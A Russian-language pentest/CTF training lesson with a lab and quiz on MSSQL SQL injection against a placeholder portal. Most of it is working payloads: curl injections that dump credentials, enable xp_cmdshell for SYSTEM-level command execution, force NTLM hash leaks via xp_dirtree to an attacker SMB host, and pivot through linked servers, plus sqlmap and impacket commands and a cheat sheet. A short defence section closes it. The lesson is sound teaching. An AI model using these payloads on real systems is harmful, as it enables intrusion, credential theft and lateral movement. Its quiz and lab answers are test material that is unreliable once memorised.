---
id: db-mssql
title: "MSSQL: инъекции на практике — xp_cmdshell и linked servers"
category: web
parent: web-sqli-dbms-enterprise
difficulty: hard
order: 1
tags: [sqli, mssql, sqlserver, xp_cmdshell, openrowset, impacket, sqlmap]
prerequisites: [web-sqli, web-sqli-dbms]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест внутренних сетей"
estimated_minutes: 45
summary: "MSSQL от фингерпринта до RCE: sys.objects, WAITFOR, xp_cmdshell, OPENROWSET, linked servers и impacket mssqlclient."
lab:
  kind: shell
  title: 'Практика: MSSQL — xp_cmdshell и дамп'
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - "Повторение (`web-sqli`): сначала фингерпринт — `curl -s \"http://portal.example/user?id=1'\"`; `Unclosed quotation mark` = MSSQL."
    - 'Диалект: `curl -s "http://portal.example/user?id=1''"` — `Unclosed quotation mark`.'
    - 'Версия и пользователь: `@@version`, `system_user`; права — `is_srvrolemember(''sysadmin'')`.'
    - 'RCE: `id=1;EXEC xp_cmdshell ''whoami''-- -`.'
    - 'Флаг — в таблице `secrets`: `STRING_AGG(password,CHAR(10)) FROM secrets`.'
---

## Задача

**Microsoft SQL Server (MSSQL)** — рабочая лошадка корпоративных Windows-приложений: ASP.NET, SharePoint, ERP. Для атакующего это подарок: процедура `xp_cmdshell` выполняет команды ОС «из коробки», `xp_dirtree` устраивает NTLM-утечки, а linked servers позволяют двигаться вглубь сети. Инъекция в MSSQL почти всегда означает путь к системной оболочке — если у пользователя есть права `sysadmin`.

Разберём этот путь на одном примере.

## Данные, с которыми работаем

Цель — `https://portal.example/user?id=1` (ASP.NET + MSSQL). Признаки MSSQL в ошибках: `Unclosed quotation mark after the character string`, `Incorrect syntax near`, `Microsoft OLE DB Provider for SQL Server`. Комментарий — `--` и `/* */`.

```bash
$ curl -s "https://portal.example/user?id=1%27" | grep -o 'Unclosed quotation[^<]*'
Unclosed quotation mark after the character string ''
```

Это MSSQL. Читаем версию, сервер и текущего пользователя:

```bash
$ curl -s "https://portal.example/user?id=-1 UNION SELECT 1,@@version,3-- -"
[[1,"Microsoft SQL Server 2019 (RTM-CU18) (KB5017593)",3]]
$ curl -s "https://portal.example/user?id=-1 UNION SELECT 1,system_user,3-- -"
[[1,"sa",3]]
```

Пользователь `sa` — это встроенный администратор SQL Server. Отличный знак: скорее всего, у нас есть `sysadmin`.

## Шаг 1: схема через sys.objects

Таблицы лежат в `sys.objects` (нужен `type='U'`, где `U` = user table). Список баз — в `master..sysdatabases`.

```bash
$ curl -s "https://portal.example/user?id=-1 UNION SELECT 1,STRING_AGG(name,','),3 FROM sys.objects WHERE type='U'-- -"
[[1,"users,products,orders",3]]
```

`STRING_AGG` есть с версии 2017; в старых собирают строку через `FOR XML PATH('')` и убирают ведущую запятую функцией `STUFF(...,1,1,'')`. Конкатенация в MSSQL — оператор `+` (или `CONCAT`).

```bash
$ curl -s "https://portal.example/user?id=-1 UNION SELECT 1,name,3 FROM sys.columns WHERE object_id=OBJECT_ID('users')-- -"
[[1,"id",3]]
[[1,"username",3]]
[[1,"password",3]]
```

## Шаг 2: дамп и error-based через CONVERT

Собираем учётки. Разделитель — `CHAR(10)` (перевод строки):

```bash
$ curl -s "https://portal.example/user?id=-1 UNION SELECT 1,STRING_AGG(username+':'+password,CHAR(10)),3 FROM users-- -"
>admin:$2a$10$...bcrypt
svc_backup:Passw0rd123<
```

Если вывод не отражается, но видно ошибку, работает **error-based** через `CONVERT`: приведение строки к `int` заставляет MSSQL вернуть её в тексте ошибки.

```bash
$ curl -s "https://portal.example/user?id=1 AND 1=CONVERT(int,@@version)-- -" | grep -o 'Conversion failed[^<]*'
Conversion failed when converting the varchar value 'Microsoft SQL Server 2019' to data type int.
```

Длинные строки режут `SUBSTRING` и склеивают из нескольких ошибок.

## Шаг 3: time-blind через WAITFOR

Задержка в MSSQL делается командой `WAITFOR DELAY 'часы:минуты:секунды'`:

```bash
$ time curl -s -o /dev/null "https://portal.example/user?id=1;WAITFOR DELAY '0:0:5'-- -"
real    0m5.03s
```

Добавив `IF <условие>`, получаем булев оракул: 5 секунд = «да». `WAITFOR TIME` вместо `DELAY` ждёт до конкретного момента времени.

## Шаг 4: проверяем права sysadmin

Прежде чем лезть в RCE, убедимся, что права позволяют:

```bash
$ curl -s "https://portal.example/user?id=-1 UNION SELECT 1,CAST(is_srvrolemember('sysadmin') AS varchar),3-- -"
[[1,"1",3]]
```

`1` — мы `sysadmin`. Теперь можно включать `xp_cmdshell`.

## Шаг 5: xp_cmdshell и RCE

`xp_cmdshell` — расширенная процедура, запускающая команды ОС. По умолчанию она отключена; включить её может только `sysadmin` через `sp_configure`:

```bash
$ curl -s "https://portal.example/user?id=1;EXEC sp_configure 'show advanced options',1;RECONFIGURE;-- -"
$ curl -s "https://portal.example/user?id=1;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -"
```

Теперь запускаем команду:

```bash
$ curl -s "https://portal.example/user?id=1;EXEC xp_cmdshell 'whoami'-- -"
nt authority\system
```

Выполнение **от SYSTEM** — максимальные права на хосте. Из MSSQL вышли в ОС. Через `impacket-mssqlclient` тот же путь проходится интерактивно:

```bash
$ impacket-mssqlclient sa:Passw0rd123@portal.example -windows-auth
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

## Шаг 6: дальше — вглубь сети

Два классических продолжения. **NTLM-утечка** через `xp_dirtree` — заставляем сервер обратиться к нашему хосту по SMB и ловим NTLM-хэш служебной учётки:

```bash
$ curl -s "https://portal.example/user?id=1;EXEC master..xp_dirtree '\\\\10.10.14.7\\share'-- -"
```

**Linked servers** — если MSSQL связан с другим сервером, запросы к нему идут с правами связанной учётки, что открывает латеральное движение:

```bash
$ curl -s "https://portal.example/user?id=1;EXEC ('SELECT @@version') AT [SQLBACKUP]-- -"
```

## Полный прогон от начала до конца

1. `id=1'` → `Unclosed quotation mark` — MSSQL, инъекция есть.
2. `UNION SELECT @@version` → `Microsoft SQL Server 2019`.
3. `system_user` → `sa`.
4. `sys.objects` → `users,products,orders`.
5. `STRING_AGG(username+':'+password)` → реальные учётки.
6. `is_srvrolemember('sysadmin')` → `1`.
7. `sp_configure 'xp_cmdshell',1;RECONFIGURE` → включили.
8. `EXEC xp_cmdshell 'whoami'` → `nt authority\system` — RCE.

## Если не сработало

- **Не `sysadmin`.** `xp_cmdshell` не включить; остаются дамп, error-based, `OPENROWSET`.
- **`xp_cmdshell` удалён.** В некоторых сборках его нет; используй `sp_OACreate` (OLE Automation) или `xp_dirtree`.
- **Кавычки фильтруются.** MSSQL понимает `CHAR(...)` для сборки строк без кавычек.
- **`STRING_AGG` отсутствует.** Версия до 2017 — собирай через `FOR XML PATH`.
- **`--` не комментирует.** Иногда нужен `;--` или блочный `/* */`.
- **sqlmap.** `sqlmap -r request.txt -p id --batch --dbms=mssql --os-shell`.

## Шпаргалка MSSQL

| Задача | Payload |
|--------|---------|
| Версия / сервер / пользователь | `@@version`, `@@servername`, `system_user` |
| Таблицы | `SELECT name FROM sys.objects WHERE type='U'` |
| Колонки | `sys.columns WHERE object_id=OBJECT_ID('users')` |
| В одну строку | `STRING_AGG(name, ',')` (2017+) или `FOR XML PATH` |
| Error-based | `CONVERT(int, <данные>)` |
| Time-blind | `WAITFOR DELAY '0:0:5'` |
| Проверка прав | `is_srvrolemember('sysadmin')` |
| RCE | `EXEC xp_cmdshell 'whoami'` (после `sp_configure`) |
| NTLM-утечка | `EXEC master..xp_dirtree '\\\\10.10.14.7\\share'` |

## На что смотреть дальше

- **`sys.objects`, не `information_schema`** — родной каталог MSSQL полнее; `type='U'` = таблицы.
- **`WAITFOR DELAY`** — единственный time-blind; `SLEEP` тут нет.
- **`is_srvrolemember('sysadmin')`** проверяй до попыток RCE.
- **`xp_dirtree` = NTLM-утечка.** Это не только чтение, но и способ получить хэш учётки сервиса.
- **Linked servers — путь вглубь.** `... AT [Server]` выполняет запрос на связанном сервере.
- **Изменения конфигурации заметны.** `sp_configure` пишется в лог; на проде — только с согласования.

## Разбор: почему xp_cmdshell — не единственный путь

Многие останавливаются на `EXEC xp_cmdshell`, а он часто отключён или запрещён политикой. Это не тупик: у MSSQL есть несколько слоёв, через которые можно выйти за пределы SQL. Первый — `OPENROWSET` и linked servers: сервер может ходить по сети к другим SQL-инстансам под своими правами, и если связь настроена с сохранёнными кредами, ты получаешь доступ дальше без единого OS-вызова.

Второй слой — CLR-сборки. Если включён `clr enabled`, можно загрузить управляемую сборку на C# и выполнять её код с правами сервисного аккаунта. Это обходит запрет на `xp_cmdshell`, потому что команда идёт не через расширенную процедуру, а через хостинг CLR.

Третий — `sp_OACreate` (OLE Automation), тоже дающий создавать COM-объекты и запускать процессы, если `Ole Automation Procedures` включены. Поэтому корректный вопрос при разведке — не «включён ли xp_cmdshell», а «какие из этих возможностей включены»:

```sql
SELECT name, value_in_use FROM sys.configurations
WHERE name IN ('xp_cmdshell','clr enabled','Ole Automation Procedures');
```

Один запрос показывает всю поверхность эскалации сразу, и ты не тратишь попытки на заведомо выключенный канал.

## Частые вопросы

**«Инъекция есть, но ошибок не видно — как узнать, что это MSSQL?»** Используй диалектные функции: `@@version`, `DB_NAME()`, `SERVERPROPERTY('ProductVersion')`. Если `@@version` возвращает строку с «Microsoft SQL Server», это MSSQL. При слепом канале сравнивай поведение `WAITFOR DELAY '0:0:5'` — пятисекундная задержка почти однозначно указывает на него.

**«Почему UNION не срабатывает, хотя колонок вроде хватает?»** В MSSQL строгий контроль типов: `UNION` с несовпадающими типами даёт ошибку конвертации. Приводи всё к одному типу явно — `CAST(NULL AS varchar)`. И помни, что число колонок здесь подбирают через `ORDER BY` и ошибки, а не перебором `NULL`.

**«xp_cmdshell включён, но команды не возвращают вывод?»** `xp_cmdshell` возвращает таблицу, и некоторые прослойки её не отдают. Пробуй записать вывод во временную таблицу и читать её отдельно, либо выноси результат через OOB-канал (DNS/HTTP), если сеть позволяет.

## Защита: как ограничить последствия

Принцип минимальных прав для аккаунта приложения убирает сразу половину техник: сервисный логин не должен быть `sysadmin` и не должен иметь `CONTROL SERVER`. Отключи неиспользуемые расширенные процедуры (`xp_cmdshell`, `Ole Automation`, CLR), закрой `OPENROWSET` и настрой linked servers без сохранённых кредов. Ограничь исходящий сетевой доступ с хоста БД, чтобы OOB-эксфильтрация не работала. И держи параметризованные запросы на уровне приложения — это причина, а всё остальное лишь следствия.

<!-- lab -->

## Квиз

Проверь себя.

```quiz
- question: 'Ошибка `Unclosed quotation mark after the character string` — это какая СУБД?'
  options:
    - "MySQL"
    - "PostgreSQL"
    - "MSSQL"
    - "SQLite"
  answer: 2
  explanation: "«Unclosed quotation mark» и «Incorrect syntax near» — отпечатки Microsoft SQL Server."
- question: "Какая процедура выполняет команды ОС в MSSQL?"
  options:
    - "pg_sleep"
    - "xp_cmdshell"
    - "load_extension"
    - "ATTACH DATABASE"
  answer: 1
  explanation: "xp_cmdshell — расширенная процедура запуска команд ОС; включается через sp_configure."
- question: "Как организовать time-blind в MSSQL?"
  options:
    - "SLEEP(5)"
    - "pg_sleep(5)"
    - "WAITFOR DELAY '0:0:5'"
    - "dbms_pipe"
  answer: 2
  explanation: "Пауза в MSSQL делается командой WAITFOR DELAY."
- question: "Что нужно, чтобы включить xp_cmdshell?"
  options:
    - "Только SELECT"
    - "Права sysadmin (проверяются is_srvrolemember)"
    - "Право FILE"
    - "Запись в web-корень"
  answer: 1
  explanation: "sp_configure с 'xp_cmdshell',1 доступен только членам роли sysadmin."
- question: "Для чего используют xp_dirtree?"
  options:
    - "Для дампа таблиц"
    - "Для NTLM-утечки: сервер обращается к нашему SMB-хосту и отдаёт хэш"
    - "Для чтения /etc/passwd"
    - "Для UNION-запроса"
  answer: 1
  explanation: "xp_dirtree инициирует SMB-обращение, из которого перехватывают NTLM-хэш."
```

## Куда дальше

Следующий урок (`db-oracle`) разберёт Oracle — корпоративную СУБД с PL/SQL, где RCE достигается через Java-процедуры, а данные утекают по DNS/HTTP через `UTL_HTTP`. А пока главное запомни: MSSQL почти всегда ведёт к ОС через `xp_cmdshell`; проверяй права `sysadmin`, а для латерального движения держи наготове `xp_dirtree` и linked servers.

## Где пригодится

- **CTF (Web/Infra):** MSSQL-задачи на `xp_cmdshell` и NTLM-утечки.
- **Bug bounty:** инъекция в ASP.NET-приложении с `sysadmin` — critical (RCE).
- **Пентест внутренних сетей:** linked servers и `xp_dirtree` — мост к латеральному движению.
- **Работа (AppSec):** минимум прав у DB-учётки, отключённый `xp_cmdshell`, аудит linked servers.
